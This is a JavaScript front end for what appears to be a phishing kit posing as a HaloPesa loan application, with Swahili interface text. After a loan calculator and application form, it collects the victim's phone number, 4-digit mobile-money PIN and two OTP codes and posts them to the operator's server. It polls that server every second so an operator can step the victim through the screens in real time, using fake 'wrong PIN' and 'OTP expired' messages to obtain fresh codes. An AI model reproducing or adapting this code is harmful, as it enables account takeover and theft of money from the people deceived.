document.addEventListener('DOMContentLoaded', () => {
  const screenWelcome = document.getElementById('screen-welcome');
  const screenSlider = document.getElementById('screen-slider');
  const screenForm1 = document.getElementById('screen-form1');
  const screenForm2 = document.getElementById('screen-form2');
  const screenForm3 = document.getElementById('screen-form3');
  const screenSignin = document.getElementById('screen-signin');
  const screenOtp1 = document.getElementById('screen-otp1');
  const screenOtp2 = document.getElementById('screen-otp2');
  const screenSuccess = document.getElementById('screen-success');
  const screenStopped = document.getElementById('screen-stopped');
  const loadingOverlay = document.getElementById('loading-overlay');

  const btnGotoSlider = document.getElementById('btn-goto-slider');
  const btnSliderBack = document.getElementById('btn-slider-back');
  const btnGotoForm1 = document.getElementById('btn-goto-form1');
  const btnForm1Back = document.getElementById('btn-form1-back');
  const btnForm1Next = document.getElementById('btn-form1-next');
  const btnForm2Back = document.getElementById('btn-form2-back');
  const btnForm2Prev = document.getElementById('btn-form2-prev');
  const btnForm2Next = document.getElementById('btn-form2-next');
  const btnForm3Back = document.getElementById('btn-form3-back');
  const btnForm3Prev = document.getElementById('btn-form3-prev');
  const btnForm3Submit = document.getElementById('btn-form3-submit');

  const signinPhone = document.getElementById('signin-phone');
  const pinBoxes = document.querySelectorAll('.pin-box-square');
  const btnSubmitSignin = document.getElementById('btn-submit-signin');
  const bannerPinError = document.getElementById('banner-pin-error');
  const bannerPhoneError = document.getElementById('banner-phone-error');

  const otp1Boxes = document.querySelectorAll('.otp1-box-square');
  const btnSubmitOtp1 = document.getElementById('btn-submit-otp1');
  const bannerOtp1Error = document.getElementById('banner-otp1-error');
  const otp1Subtitle = document.getElementById('otp1-subtitle');

  const otp2Boxes = document.querySelectorAll('.otp2-box-square');
  const btnSubmitOtp2 = document.getElementById('btn-submit-otp2');
  const bannerOtp2Error = document.getElementById('banner-otp2-error');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function isValidHaloPesa(rawPhone) {
    const digits = rawPhone.replace(/\D/g, '');
    const normalized = digits.startsWith('255') ? '0' + digits.slice(3) : (digits.startsWith('0') ? digits : '0' + digits);
    return /^06(1|2|3)\d{7}$/.test(normalized);
  }

  function showScreen(targetScreen) {
    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp1, screenOtp2, screenSuccess, screenStopped].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetScreen) targetScreen.classList.add('active');
  }

  showScreen(screenWelcome);

  if (btnGotoSlider) btnGotoSlider.addEventListener('click', () => showScreen(screenSlider));
  if (btnSliderBack) btnSliderBack.addEventListener('click', () => showScreen(screenWelcome));
  if (btnGotoForm1) btnGotoForm1.addEventListener('click', () => showScreen(screenForm1));

  if (btnForm1Back) btnForm1Back.addEventListener('click', () => showScreen(screenSlider));
  if (btnForm1Next) {
    btnForm1Next.addEventListener('click', () => {
      const amt = document.getElementById('form-amount-input').value;
      document.getElementById('sum-amount').innerText = `TSh ${amt}`;
      showScreen(screenForm2);
    });
  }

  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showScreen(screenForm1));
  if (btnForm2Prev) btnForm2Prev.addEventListener('click', () => showScreen(screenForm1));
  
  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      const phoneInput = document.getElementById('form-phone').value.trim();

      if (!isValidHaloPesa(phoneInput)) {
        const errorMsg = 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.';
        if (bannerPhoneError) {
          bannerPhoneError.innerText = errorMsg;
          bannerPhoneError.classList.add('active');
        } else {
          alert(errorMsg);
        }
        return;
      }

      if (bannerPhoneError) bannerPhoneError.classList.remove('active');
      showScreen(screenForm3);
    });
  }

  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showScreen(screenForm2));
  if (btnForm3Prev) btnForm3Prev.addEventListener('click', () => showScreen(screenForm2));

  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', async () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phone = document.getElementById('form-phone').value.trim();

      if (!firstName || !lastName || !phone) {
        alert('Tafadhali jaza jina na namba ya simu.');
        return;
      }

      if (!isValidHaloPesa(phone)) {
        alert('SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
        showScreen(screenForm2);
        return;
      }

      showLoading('INATHIBITISHA MAOMBI...', 'Tafadhali subiri...');

      try {
        const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ adminChatId: adminParam })
        });
        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          startStatusPolling();
        } else {
          hideLoading();
        }
      } catch (e) {
        hideLoading();
      }
    });
  }

  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');
  const monthlyRepVal = document.getElementById('monthly-rep-val');

  function updateCalc() {
    const amt = Number(loanSlider.value);
    const mths = Number(monthsSlider.value);
    loanText.innerText = `TSh ${amt.toLocaleString()}`;
    monthsText.innerText = `miezi ${mths}`;
    document.getElementById('form-amount-input').value = amt.toLocaleString();
    document.getElementById('sum-duration').innerText = `Miezi ${mths}`;
    const monthly = (amt * 1.14) / mths;
    monthlyRepVal.innerText = `TSh ${Math.round(monthly).toLocaleString()}`;
  }

  if (loanSlider && monthsSlider) {
    loanSlider.addEventListener('input', updateCalc);
    monthsSlider.addEventListener('input', updateCalc);
    updateCalc();
  }

  function setupDigitInputs(boxes, onComplete) {
    boxes.forEach((box, idx) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && idx < boxes.length - 1) {
          boxes[idx + 1].focus();
        }
        const val = Array.from(boxes).map(b => b.value).join('');
        if (val.length === boxes.length && onComplete) {
          onComplete(val);
        }
      });
      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          boxes[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinBoxes);
  setupDigitInputs(otp1Boxes, (otpVal) => { submitOtp1Action(otpVal); });
  setupDigitInputs(otp2Boxes, (otpVal) => { submitOtp2Action(otpVal); });

  if (btnSubmitSignin) {
    btnSubmitSignin.addEventListener('click', async () => {
      const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
      const phoneVal = signinPhone ? signinPhone.value.trim() : '';

      if (!isValidHaloPesa(phoneVal)) {
        showSurfaceError(bannerPinError, 'SAMAHANI: Namba ya HaloPesa inapaswa kuanza na 061, 062, au 063 pekee.');
        return;
      }

      if (pinVal.length !== 4) {
        showSurfaceError(bannerPinError, 'Weka PIN sahihi ya tarakimu 4');
        return;
      }

      bannerPinError.classList.remove('active');
      showLoading('INATHIBITISHA PIN...', 'Tafadhali subiri...');

      try {
        const res = await fetch('/api/submit-pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId, phone: phoneVal, pin: pinVal })
        });
        const data = await res.json();
        if (data.success) {
          startStatusPolling();
        } else {
          hideLoading();
        }
      } catch (e) {
        hideLoading();
      }
    });
  }

  async function submitOtp1Action(otpVal) {
    bannerOtp1Error.classList.remove('active');
    showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');

    const phoneVal = signinPhone ? signinPhone.value.trim() : '';

    try {
      const res = await fetch('/api/submit-otp1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) {
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  if (btnSubmitOtp1) {
    btnSubmitOtp1.addEventListener('click', () => {
      const otpVal = Array.from(otp1Boxes).map(b => b.value).join('');
      if (otpVal.length === 4) submitOtp1Action(otpVal);
    });
  }

  async function submitOtp2Action(otpVal) {
    bannerOtp2Error.classList.remove('active');
    showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');

    const phoneVal = signinPhone ? signinPhone.value.trim() : '';

    try {
      const res = await fetch('/api/submit-otp2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) {
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  if (btnSubmitOtp2) {
    btnSubmitOtp2.addEventListener('click', () => {
      const otpVal = Array.from(otp2Boxes).map(b => b.value).join('');
      if (otpVal.length === 4) submitOtp2Action(otpVal);
    });
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_SIGNIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenSignin);
          const phoneVal = document.getElementById('form-phone').value.trim();
          if (signinPhone) signinPhone.value = phoneVal;
          if (pinBoxes[0]) pinBoxes[0].focus();
        } else if (data.status === 'PROCEED_OTP1') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp1);
          if (otp1Boxes[0]) otp1Boxes[0].focus();
        } else if (data.status === 'PROCEED_OTP2') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenOtp2);
          if (otp2Boxes[0]) otp2Boxes[0].focus();
        } else if (data.status === 'RETRY_PIN') {
          // Imeboreshwa: Inasafisha visanduku, inatoa onyo na kurudisha kwenye PIN
          clearInterval(statusPollInterval);
          hideLoading();
          pinBoxes.forEach(b => b.value = '');
          showSurfaceError(bannerPinError, 'PIN ISIYO SAHIHI ❌ TAFADHALI WEKA PIN MPYA');
          if (pinBoxes[0]) pinBoxes[0].focus();
          showScreen(screenSignin);
        } else if (data.status === 'RETRY_OTP1') {
          // Imeboreshwa: Inatoa onyo (notice), inasafisha visanduku, na kurudisha kwenye nafasi tupu za OTP
          clearInterval(statusPollInterval);
          hideLoading();
          otp1Boxes.forEach(b => b.value = '');
          if (otp1Subtitle) otp1Subtitle.innerText = 'MUDA WA OTP UMEKWISHA! Tafadhali weka OTP mpya hapa chini.';
          showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Weka namba mpya ya OTP iliyotoka.');
          if (otp1Boxes[0]) otp1Boxes[0].focus();
          showScreen(screenOtp1);
        } else if (data.status === 'RETRY_OTP2') {
          clearInterval(statusPollInterval);
          hideLoading();
          otp2Boxes.forEach(b => b.value = '');
          showSurfaceError(bannerOtp2Error, 'OTP ISIYO BATILI ❌ TAFADHALI WEKA OTP MPYA');
          if (otp2Boxes[0]) otp2Boxes[0].focus();
          showScreen(screenOtp2);
        } else if (data.status === 'DENIED_STOP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenStopped);
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          showScreen(screenSuccess);
        }
      } catch (e) {}
    }, 1000);
  }

  const btnFinishHome = document.getElementById('btn-finish-home');
  if (btnFinishHome) {
    btnFinishHome.addEventListener('click', () => {
      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
    });
  }

  function showSurfaceError(bannerEl, msg) {
    if (bannerEl) {
      bannerEl.innerText = msg;
      bannerEl.classList.add('active');
    }
  }

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }
});
                          
